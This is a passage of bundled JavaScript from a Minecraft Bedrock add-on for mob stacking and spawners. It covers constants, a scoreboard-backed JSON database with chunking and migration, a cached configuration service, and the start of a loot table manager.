var __defProp = Object.defineProperty;
var __defNormalProp = (obj, key, value) => key in obj ? __defProp(obj, key, { enumerable: true, configurable: true, writable: true, value }) : obj[key] = value;
var __publicField = (obj, key, value) => {
  __defNormalProp(obj, typeof key !== "symbol" ? key + "" : key, value);
  return value;
};

// src/import.ts
import { world as world8, system as system8 } from "@minecraft/server";

// src/constants.ts
var TIMING = {
  SMALLEST_INTERVAL: 20,
  // 20 ticks = 1 second
  COOLDOWN_MILLIS: 2e3,
  MESSAGE_DELAY: 1e3,
  FORM_COOLDOWN: 3e3,
  INTERACTION_WINDOW_MILLIS: 120 * 1e3,
  // 2 minutes
  GLOBAL_COOLDOWN_MILLIS: 10 * 60 * 1e3,
  // 10 minutes
  DEATH_PROCESSED_CLEAR_INTERVAL: 600,
  // 30 seconds in ticks
  DEFAULT_SPAWN_SPEED: 15,
  DEFAULT_SPAWN_QTY: 1,
  DEFAULT_MAX_STACK: 100
};
var UI = {
  NAME_TAG_CONFIG: "\xA7e[ \xA77x# @ \xA7e]",
  ADMIN_PERMISSION_TAG: "admin",
  OWNER_PERMISSION_TAG: "owner",
  MAX_STACK_RADIUS: 100,
  MIN_STACK_RADIUS: 1,
  DEFAULT_STACK_RADIUS: 50,
  MAX_SPAWNER_LEVEL: 32,
  MIN_SPAWNER_LEVEL: 1,
  UPGRADE_COST_BASE: 1e4,
  UPGRADE_COST_MULTIPLIER: 100,
  REFUND_PERCENTAGE: 77
};
var DATABASE = {
  MAX_CHANGES_BEFORE_CLEANUP: 1e3,
  BATCH_SIZE: 10,
  MAX_DATA_LENGTH: 3e4,
  SPLIT_DELIMITER: "\n_`Split`_\n",
  DEFAULT_SAVE_INTERVAL: 5
};
var ENTITIES = {
  SPAWNRULE_ENTITY_TYPE: "mrleefy:spawnrule",
  PLAYER_TYPE_ID: "minecraft:player",
  ITEM_TYPE: "minecraft:item",
  XP_ORB_TYPE: "minecraft:xp_orb",
  MAX_ITEM_SPILL_CAP: 5,
  MAX_XP_SPILL_CAP: 3,
  DEFAULT_ITEM_SPILL_CAP: 5,
  DEFAULT_XP_SPILL_CAP: 3
};
var VALIDATION = {
  MIN_RADIUS: 1,
  MAX_RADIUS: 100,
  MIN_LEVEL: 1,
  MAX_LEVEL: 32,
  MIN_SPEED: 1,
  MAX_SPEED: 60,
  MIN_QTY: 0,
  MAX_QTY: 100,
  MIN_STACK: 1,
  MAX_STACK: 5e3
};
var ERROR_MESSAGES = {
  INVALID_PLAYER: "Invalid player provided",
  INVALID_BLOCK: "Invalid spawner block detected",
  INVALID_LEVEL: "Invalid spawner level detected",
  INVALID_COORDINATES: "Invalid spawner location detected",
  INVALID_SPAWNER_TYPE: "Invalid spawner type detected",
  NO_PERMISSION: "You don't have permission to use this feature",
  NO_SPAWNERS_INVENTORY: "You don't have enough spawners in your inventory to upgrade",
  MAX_LEVEL_REACHED: "Cannot upgrade further. Maximum level reached",
  INVALID_INPUT: "Invalid input provided",
  CONFIG_UPDATE_ERROR: "An error occurred while updating the configuration",
  INVALID_RADIUS: "Invalid input. Radius must be a positive number between 1 and 100"
};
var PERFORMANCE = {
  CACHE_DURATION: 3e4,
  // 30 seconds
  BATCH_PROCESS_SIZE: 10,
  MAX_MAP_SIZE: 1e4,
  CLEANUP_THRESHOLD: 1e3,
  ADAPTIVE_CLEANUP_THRESHOLD: 100,
  FAST_DISTANCE_THRESHOLD: 100
};

// src/database.ts
import { world, ScoreboardIdentityType, system } from "@minecraft/server";
var { FakePlayer } = ScoreboardIdentityType;
var databases = /* @__PURE__ */ new Map();
var split = DATABASE.SPLIT_DELIMITER;
system.runTimeout(() => {
  try {
    const configDb = new ScoreboardDatabaseManager("ConfigValues", DatabaseSavingModes.END_TICK_SAVE);
    configDb.load();
    if (configDb.get("migration_completed") === true) {
      return;
    }
    const oldDbNames = [
      "ConfigValues",
      "XPDropValues",
      "SpawnerLocations",
      "DisplaySpawnerPrices",
      "DisplaySpawnerConfig",
      "LootTables",
      "AAValues"
    ];
    for (const name of oldDbNames) {
      try {
        const oldObj = world.scoreboard.getObjective(name);
        if (oldObj) {
          console.warn(`[Database Migration] Found old database objective: ${name}. Starting validated migration...`);
          const newDb = new ScoreboardDatabaseManager(`ls_db:${name}`, DatabaseSavingModes.END_TICK_SAVE);
          newDb.load();
          let migrateCount = 0;
          let skipCount = 0;
          for (const participant of oldObj.getParticipants()) {
            const displayName = participant.displayName;
            const parts = displayName.split(split);
            if (parts.length >= 2) {
              const key = parts[0];
              const rawVal = parts.slice(1).join(split);
              try {
                const value = JSON.parse(rawVal);
                let isValid = false;
                if (name === "ConfigValues") {
                  if (key === "stackRadius" && typeof value === "number" && value >= 1 && value <= 100)
                    isValid = true;
                  else if (key === "spawnSpeed" && typeof value === "number" && value >= 1 && value <= 60)
                    isValid = true;
                  else if (key === "maxStack" && typeof value === "number" && value >= 1 && value <= 5e3)
                    isValid = true;
                  else if (typeof value === "boolean")
                    isValid = true;
                } else if (name === "SpawnerLocations") {
                  const coords = key.split(",");
                  if (coords.length === 3) {
                    const [x, y, z] = coords.map((c) => parseFloat(c.trim()));
                    if (!isNaN(x) && !isNaN(y) && !isNaN(z)) {
                      if (value && typeof value === "object" && typeof value.typeId === "string") {
                        isValid = true;
                      }
                    }
                  }
                } else if (name === "XPDropValues") {
                  if (typeof key === "string" && value && typeof value === "object" && typeof value.amount === "number") {
                    isValid = true;
                  }
                } else if (name === "DisplaySpawnerPrices" || name === "DisplaySpawnerConfig") {
                  if (typeof key === "string" && (typeof value === "number" || typeof value === "boolean" || typeof value === "string")) {
                    isValid = true;
                  }
                } else if (name === "LootTables") {
                  if (typeof key === "string" && value && typeof value === "object") {
                    isValid = true;
                  }
                } else if (name === "AAValues") {
                  if (typeof key === "string" && value !== void 0) {
                    isValid = true;
                  }
                }
                if (isValid) {
                  newDb.set(key, value);
                  migrateCount++;
                } else {
                  skipCount++;
                }
              } catch (e) {
                skipCount++;
              }
            }
          }
          if (migrateCount > 0) {
            newDb._executeSave();
            console.warn(`[Database Migration] Successfully migrated ${migrateCount} records (skipped ${skipCount} invalid) from ${name} -> ls_db:${name}`);
          }
          console.warn(`[Database Migration] Preserved legacy objective as read-only backup: ${name}`);
        }
      } catch (error) {
        console.error(`[Database Migration] Error migrating database ${name}:`, error);
      }
    }
    configDb.set("migration_completed", true);
    configDb._executeSave();
    console.log("[Database Migration] Migration marked as completed in new database.");
  } catch (e) {
    console.error("[Database Migration] Startup handler crashed:", e);
  }
}, 20);
var CHUNK_SIZE = 150;
var CHUNK_PREFIX = "__chunk__";
var isShutdownRegistered = false;
function safeSubstring(str, start, end) {
  if (start >= str.length)
    return "";
  let adjStart = start;
  if (start > 0 && isSurrogatePairAt(str, start - 1)) {
    adjStart = start - 1;
  }
  let adjEnd = end;
  if (end < str.length && isSurrogatePairAt(str, end - 1)) {
    adjEnd = end - 1;
  }
  return str.substring(adjStart, adjEnd);
}
function isSurrogatePairAt(str, idx) {
  const code = str.charCodeAt(idx);
  return code >= 55296 && code <= 56319;
}
if (!isShutdownRegistered) {
  isShutdownRegistered = true;
}
var DatabaseSavingModes = {
  ONE_TIME_SAVE: "OneTimeSave",
  END_TICK_SAVE: "EndTickSave",
  TICK_INTERVAL: "TickInterval"
};
var ChangeAction = {
  Change: 0,
  Remove: 1
};
function run(thisClass, key, value, action) {
  if (!thisClass._scoreboard_ || !thisClass._scoreboard_.isValid) {
    console.warn(`Database objective "${thisClass._nameId_}" was lost or invalid! Rebuilding...`);
    thisClass.rebuild();
    return;
  }
  if (thisClass._source_.has(key)) {
    const oldParticipant = thisClass._source_.get(key);
    if (Array.isArray(oldParticipant)) {
      for (const p of oldParticipant) {
        try {
          thisClass._scoreboard_.removeParticipant(p);
        } catch (e) {
        }
      }
    } else if (oldParticipant) {
      try {
        thisClass._scoreboard_.removeParticipant(oldParticipant);
      } catch (e) {
      }
    }
  }
  if (action === ChangeAction.Remove) {
    thisClass._source_.delete(key);
  } else {
    if (value && value.isChunked) {
      thisClass._source_.set(key, value.parts);
      for (const part of value.parts) {
        try {
          thisClass._scoreboard_.setScore(part, 0);
        } catch (e) {
          console.error(`Failed to setScore for chunk in database "${thisClass.id}":`, e);
        }
      }
    } else if (value) {
      thisClass._source_.set(key, value.part);
      try {
        thisClass._scoreboard_.setScore(value.part, 0);
      } catch (e) {
        console.error(`Failed to setScore in database "${thisClass.id}":`, e);
      }
    }
  }
}
var SavingModes = {
  [DatabaseSavingModes.ONE_TIME_SAVE](thisClass, key, value, action) {
    run(thisClass, key, value, action);
  },
  [DatabaseSavingModes.END_TICK_SAVE](thisClass, key, value, action) {
    thisClass._changes_.set(key, { action, value });
    thisClass.hasChanges = true;
    if (!thisClass._saveScheduled_) {
      thisClass._saveScheduled_ = true;
      system.run(() => {
        thisClass._saveScheduled_ = false;
        thisClass._executeSave();
      });
    }
  },
  [DatabaseSavingModes.TICK_INTERVAL](thisClass, key, value, action) {
    thisClass._changes_.set(key, { action, value });
    thisClass.hasChanges = true;
  }
};
var ScoreboardDatabaseManager = class extends Map {
  constructor(objective, saveMode = DatabaseSavingModes.END_TICK_SAVE, interval = 5) {
    super();
    __publicField(this, "_loaded_", false);
    __publicField(this, "_saveMode_");
    __publicField(this, "hasChanges", false);
    __publicField(this, "_loadingPromise_", null);
    __publicField(this, "_saveScheduled_", false);
    __publicField(this, "_nameId_");
    __publicField(this, "interval");
    __publicField(this, "_scoreboard_");
    __publicField(this, "_source_");
    __publicField(this, "_changes_");
    __publicField(this, "_maxChanges_");
    __publicField(this, "_lastCleanup_");
    __publicField(this, "_intervalId");
    let namespacedObjective;
    if (typeof objective === "string") {
      namespacedObjective = objective.startsWith("ls_db:") ? objective : `ls_db:${objective}`;
    } else {
      namespacedObjective = objective;
    }
    this._saveMode_ = saveMode;
    this._nameId_ = typeof namespacedObjective === "string" ? namespacedObjective : namespacedObjective.id;
    this.interval = interval ?? 5;
    const existingInstance = databases.get(this._nameId_);
    if (existingInstance)
      return existingInstance;
    this._source_ = /* @__PURE__ */ new Map();
    this._changes_ = /* @__PURE__ */ new Map();
    this._maxChanges_ = DATABASE.MAX_CHANGES_BEFORE_CLEANUP;
    this._lastCleanup_ = Date.now();
    databases.set(this._nameId_, this);
    if (this._saveMode_ === DatabaseSavingModes.TICK_INTERVAL) {
      this._intervalId = system.runInterval(() => {
        if (this.hasChanges && !this._saveScheduled_) {
          this._saveScheduled_ = true;
          system.run(() => {
            this._saveScheduled_ = false;
            this._executeSave();
          });
        }
      }, this.interval);
    }
    system.run(() => {
      try {
        this._scoreboard_ = typeof namespacedObjective === "string" ? world.scoreboard.getObjective(namespacedObjective) ?? world.scoreboard.addObjective(namespacedObjective, namespacedObjective) : namespacedObjective;
        this._nameId_ = this.id;
        this.load();
      } catch (e) {
        console.error(`[Database] Init failed for ${this._nameId_}:`, e);
      }
    });
  }
  get maxLength() {
    return DATABASE.MAX_DATA_LENGTH;
  }
  get _parser_() {
    return JSON;
  }
  get savingMode() {
    return this._saveMode_;
  }
  // Lightweight self-healing audit on reads
  _assertObjectiveValid() {
    if (!this._scoreboard_)
      return;
    if (!this._scoreboard_.isValid) {
      console.warn(`[Database] Read audit failed! Objective "${this._nameId_}" was lost. Recovering...`);
      this.rebuild();
    }
  }
  load() {
    if (this._loaded_)
      return this;
    if (!this._scoreboard_)
      return this;
    const chunkedData = /* @__PURE__ */ new Map();
    this._source_ = /* @__PURE__ */ new Map();
    super.clear();
    this._assertObjectiveValid();
    for (const participant of this._scoreboard_.getParticipants()) {
      const { displayName, type } = participant;
      if (type !== FakePlayer)
        continue;
      if (displayName.startsWith(CHUNK_PREFIX + split)) {
        const parts = displayName.split(split);
        if (parts.length >= 5) {
          const [, key, indexStr, totalStr, ...restData] = parts;
          const index = parseInt(indexStr, 10);
          const total = parseInt(totalStr, 10);
          const data = restData.join(split);
          if (isNaN(index) || isNaN(total))
            continue;
          if (!chunkedData.has(key))
            chunkedData.set(key, []);
          chunkedData.get(key).push({ index, total, data, rawName: displayName });
        }
      } else {
        const parts = displayName.split(split);
        if (parts.length >= 2) {
          const key = parts[0];
          const data = parts.slice(1).join(split);
          this._source_.set(key, displayName);
          try {
            super.set(key, this._parser_.parse(data));
          } catch (e) {
            console.error(`Error parsing data for key "${key}":`, e);
          }
        }
      }
    }
    for (const [key, chunks] of chunkedData.entries()) {
      const uniqueChunks = /* @__PURE__ */ new Map();
      for (const c of chunks) {
        uniqueChunks.set(c.index, c);
      }
      const sortedChunks = Array.from(uniqueChunks.values()).sort((a, b) => a.index - b.index);
      this._source_.set(key, sortedChunks.map((c) => c.rawName));
      if (sortedChunks.length > 0 && sortedChunks.length === sortedChunks[0].total) {
        const mergedData = sortedChunks.map((c) => c.data).join("");
        try {
          super.set(key, this._parser_.parse(mergedData));
        } catch (e) {
          console.error(`Error parsing chunked data for key "${key}":`, e);
        }
      } else {
        console.error(`Incomplete chunked data for key "${key}": expected ${sortedChunks[0]?.total} chunks, got ${sortedChunks.length}`);
      }
    }
    this._loaded_ = true;
    return this;
  }
  loadAsync() {
    if (this._loaded_)
      return this._loadingPromise_ ?? Promise.resolve(this);
    const promise = (async () => {
      return this.load();
    })();
    this._loadingPromise_ = promise;
    return promise;
  }
  set(key, value) {
    if (!this._loaded_)
      throw new ReferenceError("Database is not loaded");
    this._assertObjectiveValid();
    const serializedValue = this._parser_.stringify(value);
    const singleParticipantString = `${key}${split}${serializedValue}`;
    let changeValue;
    if (singleParticipantString.length <= 240) {
      changeValue = { isChunked: false, part: singleParticipantString };
    } else {
      const totalChunks = Math.ceil(serializedValue.length / CHUNK_SIZE);
      if (serializedValue.length > this.maxLength) {
        throw new RangeError(`Value is too large: ${serializedValue.length} characters (max: ${this.maxLength})`);
      }
      const parts = [];
      for (let i = 0; i < totalChunks; i++) {
        const chunkData = safeSubstring(serializedValue, i * CHUNK_SIZE, (i + 1) * CHUNK_SIZE);
        const partString = `${CHUNK_PREFIX}${split}${key}${split}${i}${split}${totalChunks}${split}${chunkData}`;
        if (partString.length > 256) {
          throw new RangeError(`Key name "${key}" is too long for the chunking system`);
        }
        parts.push(partString);
      }
      changeValue = { isChunked: true, parts };
    }
    super.set(key, value);
    this._onChange_(key, changeValue, ChangeAction.Change);
    return this;
  }
  delete(key) {
    if (!this._loaded_)
      throw new ReferenceError("Database is not loaded");
    this._assertObjectiveValid();
    const changeValue = null;
    super.delete(key);
    this._onChange_(key, changeValue, ChangeAction.Remove);
    return true;
  }
  clear() {
    if (!this._loaded_)
      throw new ReferenceError("Database is not loaded");
    for (const key of this.keys()) {
      this.delete(key);
    }
  }
  forEach(callback) {
    if (!this._loaded_)
      throw new ReferenceError("Database is not loaded");
    this._assertObjectiveValid();
    for (const [key, value] of this.entries()) {
      callback(value, key, this);
    }
  }
  keys() {
    if (!this._loaded_)
      throw new ReferenceError("Database is not loaded");
    this._assertObjectiveValid();
    return super.keys();
  }
  values() {
    if (!this._loaded_)
      throw new ReferenceError("Database is not loaded");
    this._assertObjectiveValid();
    return super.values();
  }
  get length() {
    this._assertObjectiveValid();
    return super.size;
  }
  _onChange_(key, value, action) {
    if (!this._loaded_)
      throw new ReferenceError("Database is not loaded");
    if (this._changes_.size > this._maxChanges_) {
      this._cleanupChanges();
    }
    SavingModes[this._saveMode_](this, key, value, action);
  }
  _cleanupChanges() {
    try {
      this._executeSave();
      this._lastCleanup_ = Date.now();
    } catch (error) {
      console.error(`Error during change cleanup: ${error}`);
    }
  }
  _executeSave() {
    if (this._changes_.size === 0)
      return;
    const pending = new Map(this._changes_);
    this._changes_.clear();
    this.hasChanges = false;
    for (const [k, { action, value }] of pending.entries()) {
      try {
        run(this, k, value, action);
      } catch (error) {
        console.error(`Error saving key "${k}" in database "${this.id}":`, error);
      }
    }
  }
  _clearInMemory() {
    super.clear();
    this._source_.clear();
    this.hasChanges = false;
  }
  get objective() {
    return this._scoreboard_;
  }
  get id() {
    return this._scoreboard_.id;
  }
  get loaded() {
    return this._loaded_;
  }
  get type() {
    return "DefaultJsonType";
  }
  get loadingAwaiter() {
    return this._loadingPromise_ ?? this.loadAsync();
  }
  cleanup() {
    if (this._loaded_) {
      this._cleanupChanges();
    }
    return this;
  }
  getStats() {
    return {
      size: this.length,
      pendingChanges: this._changes_.size,
      loaded: this._loaded_,
      saveMode: this._saveMode_,
      lastCleanup: this._lastCleanup_,
      id: this.id
    };
  }
  rebuild() {
    if (this.objective?.isValid)
      return this;
    try {
      const entries = Array.from(super.entries());
      const pendingBackup = new Map(this._changes_);
      this._clearInMemory();
      try {
        const existingObj = world.scoreboard.getObjective(this._nameId_);
        if (existingObj) {
          world.scoreboard.removeObjective(this._nameId_);
        }
      } catch (e) {
      }
      const newScores = world.scoreboard.addObjective(this._nameId_, this._nameId_);
      this._scoreboard_ = newScores;
      for (const [k, v] of entries) {
        try {
          const serializedValue = this._parser_.stringify(v);
          const singleStr = `${k}${split}${serializedValue}`;
          if (singleStr.length <= 240) {
            newScores.setScore(singleStr, 0);
            this._source_.set(k, singleStr);
          } else {
            const totalChunks = Math.ceil(serializedValue.length / CHUNK_SIZE);
            const parts = [];
            for (let i = 0; i < totalChunks; i++) {
              const chunkData = safeSubstring(serializedValue, i * CHUNK_SIZE, (i + 1) * CHUNK_SIZE);
              const partString = `${CHUNK_PREFIX}${split}${k}${split}${i}${split}${totalChunks}${split}${chunkData}`;
              parts.push(partString);
              newScores.setScore(partString, 0);
            }
            this._source_.set(k, parts);
          }
          super.set(k, v);
        } catch (entryError) {
          console.error(`Error rebuilding entry "${k}" in database "${this._nameId_}":`, entryError);
        }
      }
      this._changes_ = pendingBackup;
      if (this._changes_.size > 0)
        this.hasChanges = true;
    } catch (error) {
      console.error(`Critical error during database rebuild: ${error}`);
    }
    return this;
  }
  async rebuildAsync() {
    return this.rebuild();
  }
};
var JsonDatabase = class extends ScoreboardDatabaseManager {
  get type() {
    return "JsonType";
  }
};
var Database = class {
  constructor(name) {
    __publicField(this, "Database");
    try {
      this.Database = new JsonDatabase(name).load();
      if (!this.Database) {
        throw new Error(`Failed to create database: ${name}`);
      }
    } catch (error) {
      console.error(`Database constructor error for ${name}:`, error);
      try {
        const existing = databases.get(name);
        if (existing) {
          existing.cleanup();
          if (existing._intervalId) {
            system.clearRun(existing._intervalId);
          }
          databases.delete(name);
        }
      } catch (cleanupError) {
        console.error(`Error cleaning up failed database instance:`, cleanupError);
      }
      this.Database = /* @__PURE__ */ new Map();
    }
  }
  get length() {
    try {
      return this.Database.size || this.Database.length || 0;
    } catch (error) {
      return 0;
    }
  }
  read(key) {
    try {
      return this.Database.get ? this.Database.get(key) : void 0;
    } catch (error) {
      return void 0;
    }
  }
  write(key, value) {
    try {
      if (this.Database.set) {
        return this.Database.set(key, value);
      } else {
        throw new Error("Database does not support set operation");
      }
    } catch (error) {
      return void 0;
    }
  }
  has(key) {
    try {
      return this.Database.has ? this.Database.has(key) : false;
    } catch (error) {
      return false;
    }
  }
  delete(key) {
    try {
      return this.Database.delete(key);
    } catch (error) {
      console.error(`Database delete error for key "${key}":`, error);
      return false;
    }
  }
  clear() {
    try {
      this.Database.clear();
    } catch (error) {
      console.error(`Database clear error:`, error);
    }
  }
  keys() {
    try {
      return this.Database.keys ? Array.from(this.Database.keys()) : [];
    } catch (error) {
      return [];
    }
  }
  values() {
    try {
      return this.Database.values ? Array.from(this.Database.values()) : [];
    } catch (error) {
      return [];
    }
  }
  forEach(callback) {
    try {
      if (this.Database.forEach) {
        this.Database.forEach((value, key) => callback(value, key));
      }
    } catch (error) {
    }
  }
  getStats() {
    try {
      return this.Database && typeof this.Database.getStats === "function" ? this.Database.getStats() : { size: this.length };
    } catch (error) {
      return { error: String(error) };
    }
  }
};

// src/configuration-service.ts
var ConfigurationService = class {
  constructor() {
    __publicField(this, "configDatabase");
    __publicField(this, "xpDropDatabase");
    __publicField(this, "spawnerDatabase");
    __publicField(this, "cache");
    __publicField(this, "cacheExpiry");
    __publicField(this, "CACHE_DURATION");
    this.configDatabase = new Database("ConfigValues");
    this.xpDropDatabase = new Database("XPDropValues");
    this.spawnerDatabase = new Database("SpawnerLocations");
    this.cache = /* @__PURE__ */ new Map();
    this.cacheExpiry = /* @__PURE__ */ new Map();
    this.CACHE_DURATION = PERFORMANCE.CACHE_DURATION;
  }
  /**
   * Get cached configuration value with automatic cache management
   * @param key - Configuration key
   * @param defaultValue - Default value if key doesn't exist
   * @returns The configuration value
   */
  getConfig(key, defaultValue = null) {
    const now = Date.now();
    const cacheKey = `config_${key}`;
    if (this.cache.has(cacheKey) && (this.cacheExpiry.get(cacheKey) ?? 0) > now) {
      return this.cache.get(cacheKey);
    }
    let value;
    switch (key) {
      case "playerKillOnly":
        value = this.configDatabase.read(key) ?? false;
        break;
      case "itemSpillCap":
        value = this.configDatabase.read(key) ?? ENTITIES.DEFAULT_ITEM_SPILL_CAP;
        break;
      case "xpSpillCap":
        value = this.configDatabase.read(key) ?? ENTITIES.DEFAULT_XP_SPILL_CAP;
        break;
      case "stackRadius":
        value = this.configDatabase.read(key) ?? UI.DEFAULT_STACK_RADIUS;
        break;
      default:
        value = this.configDatabase.read(key) ?? defaultValue;
    }
    this.cache.set(cacheKey, value);
    this.cacheExpiry.set(cacheKey, now + this.CACHE_DURATION);
    return value;
  }
  /**
   * Set configuration value with cache invalidation
   * @param key - Configuration key
   * @param value - Configuration value
   */
  setConfig(key, value) {
    if (!this.validateConfig(key, value)) {
      throw new Error(`Invalid configuration value for ${key}: ${value}`);
    }
    this.configDatabase.write(key, value);
    const cacheKey = `config_${key}`;
    this.cache.delete(cacheKey);
    this.cacheExpiry.delete(cacheKey);
  }
  /**
   * Validate configuration value
   * @param key - Configuration key
   * @param value - Value to validate
   * @returns True if valid
   */
  validateConfig(key, value) {
    switch (key) {
      case "stackRadius":
        return typeof value === "number" && value >= VALIDATION.MIN_RADIUS && value <= VALIDATION.MAX_RADIUS;
      case "itemSpillCap":
      case "xpSpillCap":
        return typeof value === "number" && value >= 1 && value <= 10;
      case "playerKillOnly":
        return typeof value === "boolean";
      default:
        return true;
    }
  }
  /**
   * Get XP drop configuration for an entity
   * @param entityId - Entity identifier
   * @returns XP configuration or null
   */
  getXpDropConfig(entityId) {
    const cacheKey = `xp_${entityId}`;
    const now = Date.now();
    if (this.cache.has(cacheKey) && (this.cacheExpiry.get(cacheKey) ?? 0) > now) {
      return this.cache.get(cacheKey);
    }
    const config = this.xpDropDatabase.read(entityId);
    this.cache.set(cacheKey, config);
    this.cacheExpiry.set(cacheKey, now + this.CACHE_DURATION);
    return config;
  }
  /**
   * Set XP drop configuration for an entity
   * @param entityId - Entity identifier
   * @param config - XP configuration
   */
  setXpDropConfig(entityId, config) {
    if (!config || typeof config !== "object") {
      throw new Error("Invalid XP configuration");
    }
    if (typeof config.amount !== "number" || config.amount < 0) {
      throw new Error("Invalid XP amount");
    }
    if (typeof config.chance !== "number" || config.chance < 0 || config.chance > 100) {
      throw new Error("Invalid XP chance");
    }
    this.xpDropDatabase.write(entityId, config);
    const cacheKey = `xp_${entityId}`;
    this.cache.delete(cacheKey);
    this.cacheExpiry.delete(cacheKey);
  }
  /**
   * Get spawner location data
   * @param coordinates - Coordinate string
   * @returns Spawner data or null
   */
  getSpawnerLocation(coordinates) {
    const cacheKey = `spawner_${coordinates}`;
    const now = Date.now();
    if (this.cache.has(cacheKey) && (this.cacheExpiry.get(cacheKey) ?? 0) > now) {
      return this.cache.get(cacheKey);
    }
    const data = this.spawnerDatabase.read(coordinates);
    this.cache.set(cacheKey, data);
    this.cacheExpiry.set(cacheKey, now + this.CACHE_DURATION);
    return data;
  }
  /**
   * Set spawner location data
   * @param coordinates - Coordinate string
   * @param data - Spawner data
   */
  setSpawnerLocation(coordinates, data) {
    this.spawnerDatabase.write(coordinates, data);
    const cacheKey = `spawner_${coordinates}`;
    this.cache.delete(cacheKey);
    this.cacheExpiry.delete(cacheKey);
  }
  /**
   * Remove spawner location data
   * @param coordinates - Coordinate string
   */
  removeSpawnerLocation(coordinates) {
    this.spawnerDatabase.delete(coordinates);
    const cacheKey = `spawner_${coordinates}`;
    this.cache.delete(cacheKey);
    this.cacheExpiry.delete(cacheKey);
  }
  /**
   * Clear all configuration cache
   */
  clearCache() {
    this.cache.clear();
    this.cacheExpiry.clear();
  }
  /**
   * Get configuration statistics
   * @returns Configuration statistics
   */
  getStats() {
    return {
      cachedConfigs: this.cache.size,
      configDatabase: this.configDatabase.getStats(),
      xpDatabase: this.xpDropDatabase.getStats(),
      spawnerDatabase: this.spawnerDatabase.getStats()
    };
  }
  /**
   * Get all configuration values as an object
   * @returns All configuration values
   */
  getAllConfig() {
    return {
      playerKillOnly: this.getConfig("playerKillOnly", false),
      itemSpillCap: this.getConfig("itemSpillCap", ENTITIES.DEFAULT_ITEM_SPILL_CAP),
      xpSpillCap: this.getConfig("xpSpillCap", ENTITIES.DEFAULT_XP_SPILL_CAP),
      stackRadius: this.getConfig("stackRadius", UI.DEFAULT_STACK_RADIUS)
    };
  }
};
var configService = new ConfigurationService();

// src/performance-monitor.ts
import { system as system5 } from "@minecraft/server";

// src/mobstacker-core.ts
import { system as system4, world as world5 } from "@minecraft/server";

// src/mobstacker-ui.ts
import { world as world4, system as system3 } from "@minecraft/server";
import { ActionFormData as ActionFormData2, ModalFormData as ModalFormData2, MessageFormData } from "@minecraft/server-ui";

// src/loot_table.ts
import { world as world2, ItemStack } from "@minecraft/server";
var lootTableDatabase = new Database("LootTables");
var configDatabase = new Database("ConfigValues");
var configCache = /* @__PURE__ */ new Map();
var configCacheExpiry = /* @__PURE__ */ new Map();
var CACHE_DURATION = 3e4;
var MAX_CACHE_SIZE = 50;
function getCachedConfig(key, defaultValue) {
  const now = Date.now();
  const cacheKey = key;
  if (configCache.has(cacheKey) && (configCacheExpiry.get(cacheKey) ?? 0) > now) {
    return configCache.get(cacheKey);
  }
  const value = configDatabase.read(key) ?? defaultValue;
  configCache.set(cacheKey, value);
  configCacheExpiry.set(cacheKey, now + CACHE_DURATION);
  if (configCache.size > MAX_CACHE_SIZE) {
    const expiredKeys = [];
    for (const [k, expiry] of configCacheExpiry.entries()) {
      if (expiry <= now) {
        expiredKeys.push(k);
      }
    }
    expiredKeys.forEach((k) => {
      configCache.delete(k);
      configCacheExpiry.delete(k);
    });
    if (configCache.size > MAX_CACHE_SIZE) {
      const entries = Array.from(configCacheExpiry.entries());
      entries.sort((a, b) => a[1] - b[1]);
      const toRemove = entries.slice(0, configCache.size - MAX_CACHE_SIZE);
      toRemove.forEach(([k]) => {
        configCache.delete(k);
        configCacheExpiry.delete(k);
      });
    }
  }
  return value;
}
var ITEM_ENCHANT_CATEGORY = {
  "minecraft:iron_sword": "sword",
  "minecraft:diamond_sword": "sword",
  "minecraft:iron_axe": "axe",
  "minecraft:diamond_axe": "axe",
  "minecraft:iron_pickaxe": "pickaxe",
  "minecraft:diamond_pickaxe": "pickaxe",
  "minecraft:iron_shovel": "shovel",
  "minecraft:diamond_shovel": "shovel",
  "minecraft:iron_hoe": "hoe",
  "minecraft:diamond_hoe": "hoe",
  "minecraft:bow": "bow",
  "minecraft:crossbow": "crossbow",
  "minecraft:fishing_rod": "fishing_rod",
  "minecraft:shears": "shears",
  "minecraft:trident": "trident",
  "minecraft:iron_helmet": "helmet",
  "minecraft:iron_chestplate": "chestplate",
  "minecraft:iron_leggings": "leggings",
  "minecraft:iron_boots": "boots",
  "minecraft:chainmail_helmet": "helmet",
  "minecraft:chainmail_chestplate": "chestplate",
  "minecraft:chainmail_leggings": "leggings",
  "minecraft:chainmail_boots": "boots",
  "minecraft:diamond_helmet": "helmet",
  "minecraft:diamond_chestplate": "chestplate",
  "minecraft:diamond_leggings": "leggings",
  "minecraft:diamond_boots": "boots",
  "minecraft:leather_helmet": "helmet",
  "minecraft:leather_chestplate": "chestplate",
  "minecraft:leather_leggings": "leggings",
  "minecraft:leather_boots": "boots",
  // Stone tools
  "minecraft:stone_sword": "sword",
  "minecraft:stone_axe": "axe",
  "minecraft:stone_pickaxe": "pickaxe",
  "minecraft:stone_shovel": "shovel",
  "minecraft:stone_hoe": "hoe",
  // Golden tools
  "minecraft:golden_sword": "sword",
  "minecraft:golden_axe": "axe",
  "minecraft:golden_pickaxe": "pickaxe",
  "minecraft:golden_shovel": "shovel",
  "minecraft:golden_hoe": "hoe",
  "minecraft:golden_helmet": "helmet",
  "minecraft:golden_chestplate": "chestplate",
  "minecraft:golden_leggings": "leggings",
  "minecraft:golden_boots": "boots"
};
var _LootManager = class _LootManager {
  constructor() {
    __publicField(this, "defaultEntities");
    __publicField(this, "entities");
    __publicField(this, "enchantmentCategories");
    __publicField(this, "enchantmentIncompatibilities");
    if (_LootManager.instance) {
      return _LootManager.instance;
    }
    this.defaultEntities = {
      "mrleefy:piglinbrutestill": { "minecraft:golden_axe": { chance: 8.5 }, "minecraft:gold_nugget": { chance: 100 } },
      "mrleefy:breezestill": { "minecraft:wind_charge": { chance: 10 }, "minecraft:breeze_rod": { chance: 80 } },
      "mrleefy:ravagerstill": { "minecraft:saddle": { chance: 80 }, "minecraft:wolf_armor": { chance: 0.1 }, "minecraft:diamond_horse_armor": { chance: 0.1 }, "minecraft:golden_horse_armor": { chance: 0.2 }, "minecraft:iron_horse_armor": { chance: 1 } },
      "mrleefy:blazestill": { "minecraft:blaze_rod": { chance: 100, quantity: 1 } },
      "mrleefy:cowstill": { "minecraft:leather": { chance: 100, quantity: 1 }, "minecraft:beef": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:sheepstill": { "minecraft:wool": { chance: 100, quantity: 1, stackable: true }, "minecraft:mutton": { chance: 100, quantity: 1, stackable: true } },
